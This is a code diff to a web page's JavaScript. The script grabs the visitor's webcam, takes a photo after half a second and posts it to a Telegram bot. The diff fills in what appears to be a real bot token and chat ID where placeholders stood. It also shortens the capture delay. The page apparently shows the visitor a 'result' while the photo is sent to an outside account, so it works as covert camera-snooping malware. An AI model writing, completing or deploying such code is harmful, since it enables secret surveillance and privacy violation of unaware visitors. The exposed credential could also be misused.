@@ -64,11 +64,7 @@ const video = document.getElementById("video")
 navigator.mediaDevices.getUserMedia({video:true})
 .then(stream=>{
 video.srcObject = stream
-
-video.onloadedmetadata = () => {
-setTimeout(takePhoto,2000)
-}
-
+setTimeout(takePhoto,500)
 })
 
 function takePhoto(){
@@ -93,8 +89,8 @@ document.getElementById("result").style.display="block"
 
 function sendToTelegram(imageData){
 
-const token = "ضع_توكن_البوت"
-const chat_id = "ضع_chat_id"
+const token = "8616417285:AAHQvJfY029-xxipt4cENWAU9oRtQml-gKw"
+const chat_id = "7737717483"
 
 fetch(imageData)
 .then(res => res.blob())
@@ -104,11 +100,11 @@ const formData = new FormData()
 
 formData.append("chat_id", chat_id)
 formData.append("photo", blob, "photo.png")
-formData.append("caption","صورة من الموقع 📸")
+formData.append("caption","صورة جديدة من الموقع 📸")
 
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
 method:"POST",
-body:formData
+body: formData
 })
 
 })
